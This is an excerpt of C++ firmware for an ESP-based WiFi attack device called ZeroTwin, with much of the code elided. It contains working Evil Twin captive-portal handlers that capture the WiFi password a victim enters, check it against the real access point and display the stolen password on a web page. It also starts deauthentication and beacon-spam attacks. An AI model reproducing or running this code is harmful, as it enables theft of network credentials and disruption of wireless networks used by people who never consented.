...
// New ZeroTwin Evil Twin functions
String header(String t) {
  String a = String(evilTwinSSID);
...
void handleEvilTwinResult() {
  if (WiFi.status() != WL_CONNECTED) {
    ...
    display.drawString(0, 38, "[-] User entered wrong password!");
    display.display();
    ...
    _correct = "Password for " + evilTwinSSID + "<br> Result: " + _tryPassword;

    display.drawString(0, 38, "[+] Password captured!");
    display.drawString(0, 45, "[*] Check web interface");
    display.display();
    
    deauthing_active = false;
    display.drawString(0, 52, "[*] Stopping EvilTwin");
    display.display();
...
void handleEvilTwinPortal() {
  if (webServer.hasArg("password")) {
    ...
    display.drawString(0, 45, "[*] User input password");
    display.drawString(0, 52, "[*] > " + _tryPassword.substring(0, 10));
    display.display();
    
    // Try to connect to the real network
    for (uint8_t i = 0; i < apCount; i++) {
      if (accessPoints[i].ssid == evilTwinSSID) {
        uint8_t bssid[6];
        macToBytes(accessPoints[i].bssid, bssid);
        WiFi.begin(evilTwinSSID.c_str(), _tryPassword.c_str(), accessPoints[i].channel, bssid);
        break;
      }
    }
    
    webServer.send(200, "text/html", evilTwinPosted());

    display.clear();
    display.drawString(0, 10, "[*] Testing password...");
    display.display();
    
  } else {
    webServer.send(200, "text/html", evilTwinIndex());
  }
}
...
void startAttack(AttackMode mode) {
  ...
  if (mode == ATTACK_EVIL_TWIN) {
    ...
    webServer.on("/result", handleEvilTwinResult);
    ...
    display.drawString(0, 38, "[*] EvilTwin started");
    display.display();
    
  } else if (mode == ATTACK_DEAUTH) {
    deauthing_active = true;
    display.drawString(0, 38, "[*] Deauth started");
    display.display();
  }
}
...
// Web interface handlers (simplified for ZeroTwin)
void handleRoot() {
  ...
  html += "input, select { width: 100%; padding: 8px; background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: #c9d1d9; }";
  ...
  if (currentAttack == ATTACK_EVIL_TWIN && !_tryPassword.isEmpty()) {
    html += "<p>> Captured password: <span style='color:red'>" + _tryPassword + "</span></p>";
  }
...
void handleDeauth() {
  ...
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Deauth Attack - ZeroTwin v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
...
void handleEvilTwinSetup() {
  ...
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Evil Twin - ZeroTwin v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
...
void handleBeacon() {
  ...
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Beacon Spam - ZeroTwin v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
